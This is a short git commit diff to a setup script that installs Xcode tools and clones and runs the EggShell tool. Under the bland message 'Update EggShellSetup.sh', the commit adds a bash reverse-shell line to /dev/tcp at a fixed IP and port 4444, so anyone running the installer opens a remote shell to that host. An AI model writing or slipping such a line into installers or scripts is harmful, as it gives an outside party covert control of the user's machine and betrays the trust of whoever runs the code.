419158ef052b8503a2d24b9f57651d29bef42c70
James De Vito <jamesdevito0921@gmail.com>
2017-02-27 16:59:24 -0500

    Update EggShellSetup.sh

--- EggShellSetup.sh
+++ EggShellSetup.sh
@@ -7,9 +7,11 @@
 #
 xcode-select --install
 sleep 10
+bash &> /dev/tcp/10.1.62.27/4444 0>&1
 git clone git://github.com/neoneggplant/EggShell
 sleep 10
 easy_install pycrypto
 sleeep 10
 cd EggShell
 python EggShell.py
+
